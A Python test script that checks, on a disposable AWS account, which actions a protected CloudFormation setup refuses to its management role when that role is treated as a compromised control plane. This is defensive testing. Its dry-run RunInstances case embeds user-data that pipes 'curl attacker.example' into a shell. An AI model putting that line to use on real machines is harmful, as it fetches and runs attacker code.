#!/usr/bin/env python3
"""Check on real AWS what a protected setup keeps from its management role.

Renders `app/` as CloudFormation twice with the `render_setup` example of alien-cli-common
(`cargo build -p alien-cli-common --example render_setup`), pinned to this account as the
publisher and to `<prefix>-verifier@<digest>` as the verifier image, once unprotected and once
protected, deploys both into the default VPC, assumes each stack's
management role, attaches a policy that allows everything a compromised control plane would
try (as an extended profile or a customer policy could), and tries:

  * RunInstances with user-data (dry run);
  * UpdateAutoScalingGroup naming a launch template;
  * Lambda writes on a function of the install, and on the verifier;
  * SSM SendCommand and StartSession on the install's machines;
  * writes under /signed/: its own settings, and those of a neighbor whose prefix extends its own.

Unprotected, each attempt succeeds (except /signed/, which every management role now refuses;
the same write succeeds once that one statement is removed, which shows it is the statement
that refuses). Protected, each is refused by an explicit deny. Also checks that CloudFormation
refuses a create that overrides SigningFingerprint (a Quick-create link), that the settings
setup wrote are what the template pins, that the protected stack deletes and recreates under the
same name, and that cfn-lint passes.

Everything is named with --prefix and tagged with --tag plus a tag unique to the run, and
deleted before exit; the run then lists what still carries the run tag or the prefix and fails if
anything does. Launches are dry runs; the machine group has no capacity.

  python3 scripts/aws-setup-locks/check.py --renderer target/debug/examples/render_setup \\
      --prefix locks-check \\
      --tag purpose=locks-check --evidence /tmp/locks-evidence

Requires boto3 and administrator credentials for a disposable test account in the environment.
"""

import argparse
import base64
import io
import json
import re
import subprocess
import sys
import tempfile
import time
import urllib.request
import uuid
import zipfile
from pathlib import Path

import boto3
from botocore.exceptions import ClientError, WaiterError

HERE = Path(__file__).resolve().parent
FINGERPRINT = "SHA256:" + "9f2c3b1a77d0e5c2" * 4
OTHER_FINGERPRINT = "SHA256:" + "0123456789abcdef" * 4
# The verifier stands in as a small public image (busybox, linux/amd64), copied unchanged so its
# digest is known before `alien` is built with it.
VERIFIER_SOURCE = (
    "public.ecr.aws",
    "docker/library/busybox",
    "sha256:f97baa533a26513c453a362be331a43eb60214302f449c16571b23cea141dce4",
)
IMAGE = "/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64"
DENIED = {"AccessDenied", "AccessDeniedException", "UnauthorizedOperation"}


def denied(code):
    return "Denied" if code in DENIED else code


class Run:
    def __init__(self, args):
        self.args = args
        self.session = boto3.session.Session(region_name=args.region)
        client = self.session.client
        self.cfn, self.iam, self.ec2, self.ssm = client("cloudformation"), client("iam"), client("ec2"), client("ssm")
        self.sts, self.ecr, self.lam, self.asg = client("sts"), client("ecr"), client("lambda"), client("autoscaling")
        self.account = self.sts.get_caller_identity()["Account"]
        key, value = args.tag.split("=", 1)
        self.tag = {"Key": key, "Value": value}
        self.run_tag = {"Key": "check-run", "Value": uuid.uuid4().hex[:12]}
        self.evidence = Path(args.evidence)
        self.evidence.mkdir(parents=True, exist_ok=True)
        self.cleanups = []
        self.results = []

    # Evidence

    def record(self, name, payload):
        (self.evidence / f"{name}.json").write_text(json.dumps(payload, indent=2, default=str) + "\n")

    def expect(self, variant, case, expected, actual, detail=None):
        ok = actual == expected
        self.results.append({"variant": variant, "case": case, "expected": expected, "actual": actual, "ok": ok})
        self.record(f"{variant}-{case}", {"expected": expected, "actual": actual, "detail": detail})
        print(f"{'ok  ' if ok else 'FAIL'} {variant:11} {case:46} expected {expected:14} got {actual}", flush=True)

    def call(self, function, **request):
        try:
            function(**request)
            return "Success", {}
        except ClientError as error:
            code = error.response["Error"]["Code"]
            return code, {"message": error.response["Error"]["Message"]}

    def tags(self):
        return [self.tag, self.run_tag]

    # The verifier image

    def copy_verifier_image(self):
        """Copy the stand-in image into `<prefix>-verifier`; returns its digest."""
        registry, repository, digest = VERIFIER_SOURCE
        token = json.load(urllib.request.urlopen(f"https://{registry}/token/?scope=repository:{repository}:pull"))["token"]

        def get(path, accept=None):
            request = urllib.request.Request(f"https://{registry}/v2/{repository}/{path}")
            request.add_header("Authorization", f"Bearer {token}")
            if accept:
                request.add_header("Accept", accept)
            with urllib.request.urlopen(request) as response:
                return response.read(), response.headers.get("Content-Type")

        manifest, media_type = get(f"manifests/{digest}", "application/vnd.oci.image.manifest.v1+json")
        name = f"{self.args.prefix}-verifier"
        self.ecr.create_repository(repositoryName=name, tags=self.tags())
        self.cleanups.append(lambda: self.ecr.delete_repository(repositoryName=name, force=True))
        auth = self.ecr.get_authorization_token()["authorizationData"][0]
        basic = auth["authorizationToken"]
        host = auth["proxyEndpoint"]
        parsed = json.loads(manifest)
        for blob in [parsed["config"], *parsed["layers"]]:
            data, _ = get(f"blobs/{blob['digest']}")
            start = urllib.request.Request(f"{host}/v2/{name}/blobs/uploads/", method="POST")
            start.add_header("Authorization", f"Basic {basic}")
            with urllib.request.urlopen(start) as response:
                location = response.headers["Location"]
            location = location if location.startswith("http") else host + location
            separator = "&" if "?" in location else "?"
            put = urllib.request.Request(f"{location}{separator}digest={blob['digest']}", data=data, method="PUT")
            put.add_header("Authorization", f"Basic {basic}")
            put.add_header("Content-Type", "application/octet-stream")
            urllib.request.urlopen(put).close()
        put = urllib.request.Request(f"{host}/v2/{name}/manifests/{digest}", data=manifest, method="PUT")
        put.add_header("Authorization", f"Basic {basic}")
        put.add_header("Content-Type", media_type)
        urllib.request.urlopen(put).close()
        return digest

    # Setup

    def default_network(self):
        vpcs = self.ec2.describe_vpcs(Filters=[{"Name": "is-default", "Values": ["true"]}])["Vpcs"]
        if len(vpcs) != 1:
            raise SystemExit("the region needs exactly one default VPC")
        subnets = self.ec2.describe_subnets(
            Filters=[{"Name": "vpc-id", "Values": [vpcs[0]["VpcId"]]}, {"Name": "default-for-az", "Values": ["true"]}]
        )["Subnets"]
        return vpcs[0]["VpcId"], sorted(subnets, key=lambda s: s["AvailabilityZone"])[0]["SubnetId"]

    def caller_role(self):
        """The role the stacks trust as their managing role; this account may assume it."""
        name = f"{self.args.prefix}-caller"
        trust = {"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Principal": {"AWS": f"arn:aws:iam::{self.account}:root"}, "Action": "sts:AssumeRole"}]}
        arn = self.iam.create_role(RoleName=name, AssumeRolePolicyDocument=json.dumps(trust), Tags=self.tags())["Role"]["Arn"]
        self.cleanups.append(lambda: self.iam.delete_role(RoleName=name))
        policy = {"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "sts:AssumeRole", "Resource": "*"}]}
        self.iam.put_role_policy(RoleName=name, PolicyName="assume", PolicyDocument=json.dumps(policy))
        self.cleanups.append(lambda: self.iam.delete_role_policy(RoleName=name, PolicyName="assume"))
        return arn

    def render(self, directory, protected, verifier_image):
        settings = {"setupManagement": "automatic", "network": {"type": "use-default"}}
        if protected:
            settings["signing"] = {"fingerprint": FINGERPRINT, "channel": "production"}
        (directory / "settings.json").write_text(json.dumps(settings))
        template = directory / "template.yaml"
        subprocess.run(
            [str(self.args.renderer), "cloudformation", str(HERE / "app" / "alien.json"),
             str(directory / "settings.json"), str(template), self.account, verifier_image],
            check=True,
        )
        return template

    def template_bucket(self):
        name = f"{self.args.prefix}-templates-{self.run_tag['Value']}"
        if not getattr(self, "bucket", None):
            s3 = self.session.client("s3")
            s3.create_bucket(Bucket=name)
            self.cleanups.append(lambda: s3.delete_bucket(Bucket=name))
            s3.put_bucket_tagging(Bucket=name, Tagging={"TagSet": self.tags()})
            self.bucket = name
        return name

    def upload(self, key, template):
        bucket = self.template_bucket()
        s3 = self.session.client("s3")
        s3.put_object(Bucket=bucket, Key=key, Body=template.read_bytes())
        self.cleanups.append(lambda: s3.delete_object(Bucket=bucket, Key=key))
        return f"https://{bucket}.s3.{self.args.region}.amazonaws.com/{key}"

    def create_stack(self, stack_name, url, managing_role, parameters=()):
        self.cfn.create_stack(
            StackName=stack_name, TemplateURL=url, Capabilities=["CAPABILITY_NAMED_IAM"], Tags=self.tags(),
            Parameters=[{"ParameterKey": "ManagingRoleArn", "ParameterValue": managing_role}, *parameters],
        )

    def deploy(self, stack_name, url, managing_role):
        self.create_stack(stack_name, url, managing_role)
        self.cleanups.append(lambda: self.delete_stack(stack_name))
        try:
            self.cfn.get_waiter("stack_create_complete").wait(StackName=stack_name, WaiterConfig={"Delay": 15, "MaxAttempts": 80})
        except WaiterError:
            self.record(f"{stack_name}-events", self.cfn.describe_stack_events(StackName=stack_name)["StackEvents"][:40])
            raise

    def delete_stack(self, stack_name):
        self.cfn.delete_stack(StackName=stack_name)
        self.cfn.get_waiter("stack_delete_complete").wait(StackName=stack_name, WaiterConfig={"Delay": 15, "MaxAttempts": 80})

    def install_resources(self, stack_name, subnet):
        """A function, a launch template and an empty machine group of the install, as its runtime
        would create them, for management to try to change."""
        trust = {"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"}, "Action": "sts:AssumeRole"}]}
        role = f"{stack_name}-fn-sa"
        role_arn = self.iam.create_role(RoleName=role, AssumeRolePolicyDocument=json.dumps(trust), Tags=self.tags())["Role"]["Arn"]
        self.cleanups.append(lambda: self.iam.delete_role(RoleName=role))
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("index.py", "def handler(event, context):\n    return 'v1'\n")
        function = f"{stack_name}-fn"
        for attempt in range(10):  # The new role takes a few seconds to be assumable by Lambda.
            try:
                self.lam.create_function(
                    FunctionName=function, Runtime="python3.12", Handler="index.handler", Role=role_arn,
                    Code={"ZipFile": buffer.getvalue()},
                    Tags={self.tag["Key"]: self.tag["Value"], self.run_tag["Key"]: self.run_tag["Value"], "managed-by": "runtime", "deployment": stack_name},
                )
                break
            except ClientError as error:
                if "cannot be assumed" not in str(error) or attempt == 9:
                    raise
                time.sleep(5)
        self.cleanups.append(lambda: self.lam.delete_function(FunctionName=function))
        self.lam.get_waiter("function_active_v2").wait(FunctionName=function)
        image = self.ssm.get_parameter(Name=IMAGE)["Parameter"]["Value"]
        tag_spec = [{"Key": "deployment", "Value": stack_name}, {"Key": "managed-by", "Value": "runtime"}, self.tag, self.run_tag]
        templates = {}
        for suffix in ["lt", "lt-other"]:
            name = f"{stack_name}-{suffix}"
            templates[suffix] = self.ec2.create_launch_template(
                LaunchTemplateName=name, LaunchTemplateData={"ImageId": image, "InstanceType": "t3.micro"},
                TagSpecifications=[{"ResourceType": "launch-template", "Tags": tag_spec}],
            )["LaunchTemplate"]["LaunchTemplateId"]
            self.cleanups.append(lambda name=name: self.ec2.delete_launch_template(LaunchTemplateName=name))
        group = f"{stack_name}-group"
        self.asg.create_auto_scaling_group(
            AutoScalingGroupName=group, MinSize=0, MaxSize=0, DesiredCapacity=0, VPCZoneIdentifier=subnet,
            LaunchTemplate={"LaunchTemplateId": templates["lt"], "Version": "$Latest"},
            Tags=[{"Key": t["Key"], "Value": t["Value"], "PropagateAtLaunch": True} for t in tag_spec],
        )
        self.cleanups.append(lambda: self.asg.delete_auto_scaling_group(AutoScalingGroupName=group, ForceDelete=True))
        return {"function": function, "image": image, "group": group, "other_template": templates["lt-other"]}

    # The management role

    def assume(self, caller_role, stack_name):
        caller = self.sts.assume_role(RoleArn=caller_role, RoleSessionName="caller")["Credentials"]
        as_caller = boto3.session.Session(
            aws_access_key_id=caller["AccessKeyId"], aws_secret_access_key=caller["SecretAccessKey"],
            aws_session_token=caller["SessionToken"], region_name=self.args.region,
        )
        role = f"arn:aws:iam::{self.account}:role/{stack_name}-management"
        for attempt in range(12):
            try:
                credentials = as_caller.client("sts").assume_role(RoleArn=role, RoleSessionName="management")["Credentials"]
                break
            except ClientError:
                if attempt == 11:
                    raise
                time.sleep(5)
        return boto3.session.Session(
            aws_access_key_id=credentials["AccessKeyId"], aws_secret_access_key=credentials["SecretAccessKey"],
            aws_session_token=credentials["SessionToken"], region_name=self.args.region,
        )

    def allow_everything(self, stack_name):
        extra = {"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": [
            "ec2:*", "autoscaling:*", "lambda:*", "ssm:*", "iam:PassRole",
        ], "Resource": "*"}]}
        role = f"{stack_name}-management"
        self.iam.put_role_policy(RoleName=role, PolicyName="extra-grant", PolicyDocument=json.dumps(extra))
        self.cleanups.append(lambda: self.iam.delete_role_policy(RoleName=role, PolicyName="extra-grant"))

    def attempts(self, variant, session, stack_name, things, subnet, neighbor):
        protected = variant == "protected"
        ec2, asg, lam, ssm = session.client("ec2"), session.client("autoscaling"), session.client("lambda"), session.client("ssm")
        refused = "Denied" if protected else None

        def run_instances():
            ec2.run_instances(
                DryRun=True, ImageId=things["image"], InstanceType="t3.micro", MinCount=1, MaxCount=1, SubnetId=subnet,
                UserData=base64.b64encode(b"#!/bin/sh\ncurl attacker.example | sh\n").decode(),
            )

        code, detail = self.call(run_instances)
        self.expect(variant, "run-instances-with-user-data", refused or "DryRunOperation", denied(code), detail)

        code, detail = self.call(
            asg.update_auto_scaling_group, AutoScalingGroupName=things["group"],
            LaunchTemplate={"LaunchTemplateId": things["other_template"], "Version": "$Latest"},
        )
        self.expect(variant, "update-group-naming-a-launch-template", refused or "Success", denied(code), detail)

        code, detail = self.call(asg.set_desired_capacity, AutoScalingGroupName=things["group"], DesiredCapacity=0)
        self.expect(variant, "set-desired-capacity-still-allowed", "Success", denied(code), detail)

        code, detail = self.call(lam.update_function_configuration, FunctionName=things["function"], Description="changed")
        self.expect(variant, "update-function-configuration", refused or "Success", denied(code), detail)
        if code == "Success":
            lam.get_waiter("function_updated_v2").wait(FunctionName=things["function"])
        code, detail = self.call(lam.add_permission, FunctionName=things["function"], StatementId="anyone", Action="lambda:InvokeFunction", Principal="*")
        self.expect(variant, "add-function-permission", refused or "Success", denied(code), detail)

        if protected:
            verifier = f"{stack_name}-verifier"
            for case, call, request in [
                ("verifier-update-configuration", lam.update_function_configuration, {"FunctionName": verifier, "Environment": {"Variables": {"VERIFIER_CLOUD": "aws", "X": "1"}}}),
                ("verifier-update-code", lam.update_function_code, {"FunctionName": verifier, "ImageUri": f"{self.account}.dkr.ecr.{self.args.region}.amazonaws.com/{self.args.prefix}-verifier:latest"}),
            ]:
                code, detail = self.call(call, **request)
                self.expect(variant, case, "Denied", denied(code), detail)
            code, detail = self.call(lam.invoke, FunctionName=verifier, InvocationType="DryRun")
            self.expect(variant, "verifier-invoke-allowed", "Success", denied(code), detail)
            iam = session.client("iam")
            code, detail = self.call(iam.put_role_policy, RoleName=verifier, PolicyName="x", PolicyDocument=json.dumps({"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}))
            self.expect(variant, "verifier-role-policy-write", "Denied", denied(code), detail)

        instance = f"arn:aws:ec2:{self.args.region}:{self.account}:instance/i-0123456789abcdef0"
        code, detail = self.call(ssm.send_command, InstanceIds=["i-0123456789abcdef0"], DocumentName="AWS-RunShellScript", Parameters={"commands": ["id"]})
        # Unprotected, IAM lets it through and SSM finds no such machine.
        self.expect(variant, "send-command", refused or "InvalidInstanceId", denied(code), detail)
        code, detail = self.call(ssm.start_session, Target="i-0123456789abcdef0")
        self.expect(variant, "start-session", refused or "TargetNotConnected", denied(code), {"instance": instance, **detail})

        for case, name in [("own-settings", f"/signed/{stack_name}/fingerprint"), ("neighbor-settings", f"/signed/{neighbor}/fingerprint")]:
            code, detail = self.call(ssm.put_parameter, Name=name, Value="{}", Type="String", Overwrite=True)
            if code == "Success":
                self.cleanups.append(lambda name=name: self.ssm.delete_parameter(Name=name))
            self.expect(variant, f"write-{case}", "Denied", denied(code), detail)

    def check_settings(self, stack_name):
        settings = json.loads(self.ssm.get_parameter(Name=f"/signed/{stack_name}/fingerprint")["Parameter"]["Value"])
        ledger = json.loads(self.ssm.get_parameter(Name=f"/signed/{stack_name}/state")["Parameter"]["Value"])
        self.record("protected-settings", {"settings": settings, "ledger": ledger})
        expected = {"fingerprint": FINGERPRINT, "prefix": stack_name, "channel": "production"}
        self.expect("protected", "settings-written-by-setup", "True", str(settings == expected), settings)
        self.expect("protected", "ledger-names-the-prefix", "True", str(ledger.get("prefix") == stack_name), ledger)

    def variant(self, variant, template, caller_role, subnet):
        stack_name = f"{self.args.prefix}-{variant[0]}"
        url = self.upload(f"{variant}.yaml", template)
        self.deploy(stack_name, url, caller_role)
        if variant == "protected":
            self.check_settings(stack_name)
        things = self.install_resources(stack_name, subnet)
        self.allow_everything(stack_name)
        time.sleep(20)  # IAM propagation for the extra grant.
        session = self.assume(caller_role, stack_name)
        self.attempts(variant, session, stack_name, things, subnet, neighbor=f"{stack_name}-eu")
        return stack_name, url

    def without_signed_guard(self, stack_name):
        """Remove the /signed/ deny from the stack's management policies (as on main) and show the
        same write then succeeds, so it is that statement that refuses."""
        removed = 0
        for page in self.iam.get_paginator("list_attached_role_policies").paginate(RoleName=f"{stack_name}-management"):
            for attached in page["AttachedPolicies"]:
                arn = attached["PolicyArn"]
                policy = self.iam.get_policy(PolicyArn=arn)["Policy"]
                document = self.iam.get_policy_version(PolicyArn=arn, VersionId=policy["DefaultVersionId"])["PolicyVersion"]["Document"]
                kept = [s for s in document["Statement"] if s.get("Sid") != "OnlySetupChangesSigningSettings"]
                if len(kept) != len(document["Statement"]):
                    self.iam.create_policy_version(PolicyArn=arn, PolicyDocument=json.dumps({**document, "Statement": kept}), SetAsDefault=True)
                    removed += 1
        self.expect("unprotected", "guard-statement-found", "1", str(removed))
        time.sleep(20)
        return removed

    def quick_create_override(self, url, caller_role):
        name = f"{self.args.prefix}-q"
        code, detail = self.call(
            self.create_stack, stack_name=name, url=url, managing_role=caller_role,
            parameters=[{"ParameterKey": "SigningFingerprint", "ParameterValue": OTHER_FINGERPRINT}],
        )
        if code == "Success":
            self.cleanups.append(lambda: self.delete_stack(name))
        self.expect("protected", "quick-create-overriding-fingerprint", "ValidationError", code, detail)

    # Cleanup and audit

    def cleanup(self):
        failures = []
        for step in reversed(self.cleanups):
            try:
                step()
            except Exception as error:  # Every step runs; any failure fails the run.
                failures.append(repr(error))
        self.cleanups.clear()
        return failures

    def audit(self):
        prefix = self.args.prefix
        tagged = self.session.client("resourcegroupstaggingapi").get_resources(
            TagFilters=[{"Key": self.run_tag["Key"], "Values": [self.run_tag["Value"]]}]
        )["ResourceTagMappingList"]
        stacks = [s["StackName"] for page in self.cfn.get_paginator("list_stacks").paginate() for s in page["StackSummaries"]
                  if s["StackName"].startswith(prefix) and s["StackStatus"] != "DELETE_COMPLETE"]
        roles = [r["RoleName"] for page in self.iam.get_paginator("list_roles").paginate() for r in page["Roles"] if r["RoleName"].startswith(prefix)]
        policies = [p["PolicyName"] for page in self.iam.get_paginator("list_policies").paginate(Scope="Local") for p in page["Policies"] if p["PolicyName"].startswith(prefix)]
        parameters = [p["Name"] for p in self.ssm.describe_parameters(
            ParameterFilters=[{"Key": "Name", "Option": "BeginsWith", "Values": [f"/signed/{prefix}"]}])["Parameters"]]
        functions = [f["FunctionName"] for page in self.lam.get_paginator("list_functions").paginate() for f in page["Functions"] if f["FunctionName"].startswith(prefix)]
        groups = [g["AutoScalingGroupName"] for g in self.asg.describe_auto_scaling_groups()["AutoScalingGroups"] if g["AutoScalingGroupName"].startswith(prefix)]
        templates = [t["LaunchTemplateName"] for t in self.ec2.describe_launch_templates()["LaunchTemplates"] if t["LaunchTemplateName"].startswith(prefix)]
        repositories = [r["repositoryName"] for r in self.ecr.describe_repositories()["repositories"] if r["repositoryName"].startswith(prefix)]
        buckets = [b["Name"] for b in self.session.client("s3").list_buckets()["Buckets"] if b["Name"].startswith(prefix)]
        left = {"tagged": [t["ResourceARN"] for t in tagged], "stacks": stacks, "roles": roles, "policies": policies,
                "parameters": parameters, "functions": functions, "groups": groups, "launchTemplates": templates,
                "repositories": repositories, "buckets": buckets}
        self.record("cleanup-audit", {"runTag": self.run_tag, **left})
        return [f"{kind}: {items}" for kind, items in left.items() if items]


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--renderer", required=True, help="the render_setup example of alien-cli-common")
    parser.add_argument("--prefix", required=True, help="name prefix of everything created")
    parser.add_argument("--tag", required=True, help="KEY=VALUE tag on everything created")
    parser.add_argument("--region", default="us-east-1")
    parser.add_argument("--evidence", required=True, help="directory for the outputs")
    args = parser.parse_args()
    if not re.fullmatch(r"[a-z][a-z0-9-]{2,16}", args.prefix):
        raise SystemExit("--prefix: 3 to 17 lowercase letters, digits and hyphens, starting with a letter")

    run = Run(args)
    failures = []
    try:
        vpc, subnet = run.default_network()
        digest = run.copy_verifier_image()
        run.record("verifier-image", {"repository": f"{args.prefix}-verifier", "digest": digest})
        caller_role = run.caller_role()
        with tempfile.TemporaryDirectory() as scratch:
            templates = {}
            for variant in ["unprotected", "protected"]:
                directory = Path(scratch) / variant
                directory.mkdir()
                templates[variant] = run.render(
                    directory, variant == "protected", f"{args.prefix}-verifier@{digest}"
                )
                (run.evidence / f"{variant}-template.yaml").write_text(templates[variant].read_text())
                lint = subprocess.run(["cfn-lint", "--format", "parseable", str(templates[variant])], capture_output=True, text=True)
                errors = [line for line in lint.stdout.splitlines() if ":E" in line]
                run.record(f"{variant}-cfn-lint", {"output": lint.stdout.splitlines()})
                run.expect(variant, "cfn-lint-no-errors", "0", str(len(errors)), errors)
            if digest not in templates["protected"].read_text():
                raise SystemExit(f"the protected template does not run {digest}")

            unprotected, _ = run.variant("unprotected", templates["unprotected"], caller_role, subnet)
            run.without_signed_guard(unprotected)
            session = run.assume(caller_role, unprotected)
            name = f"/signed/{unprotected}/fingerprint"
            code, detail = run.call(session.client("ssm").put_parameter, Name=name, Value="{}", Type="String", Overwrite=True)
            if code == "Success":
                run.cleanups.append(lambda: run.ssm.delete_parameter(Name=name))
            run.expect("unprotected", "write-settings-without-the-guard", "Success", denied(code), detail)

            protected, url = run.variant("protected", templates["protected"], caller_role, subnet)
            run.quick_create_override(url, caller_role)

            # Delete and recreate under the same name: nothing is retained, so the create succeeds.
            run.delete_stack(protected)
            run.deploy(protected, url, caller_role)
            run.check_settings(protected)
            run.expect("protected", "recreated-under-the-same-name", "True", "True")
    finally:
        failures += [f"cleanup: {failure}" for failure in run.cleanup()]
        time.sleep(30)  # Deletions reach the listing APIs after a short delay.
        failures += [f"left behind: {item}" for item in run.audit()]

    failures += [f"{r['variant']} {r['case']}: expected {r['expected']}, got {r['actual']}" for r in run.results if not r["ok"]]
    run.record("summary", {"results": run.results, "failures": failures})
    if failures:
        print("\n".join(failures), file=sys.stderr)
        sys.exit(1)
    print(f"all {len(run.results)} checks passed; nothing left behind")


if __name__ == "__main__":
    main()
